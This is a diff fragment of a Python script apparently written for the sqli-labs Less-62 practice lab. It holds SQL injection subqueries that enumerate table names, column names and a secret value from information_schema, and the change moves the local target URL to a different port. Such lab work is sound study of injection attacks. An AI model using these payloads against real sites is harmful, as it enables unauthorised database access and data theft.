@@ -11,7 +11,7 @@ import requests
 get_table = "(select table_name from information_schema.tables where table_schema= database() limit 0,1)"
 get_column = "(select column_name from information_schema.columns where table_name = '{0}' limit 2,1)"
 get_secret = "(select {0} from {1} )"
-base_url = "http://localhost:8888/sqli-labs/Less-62/?id=1"
+base_url = "http://localhost:1234/Less-62/?id=1"
 session = requests.Session()
 success = len(requests.get(base_url).text)
 number_of_request = 0
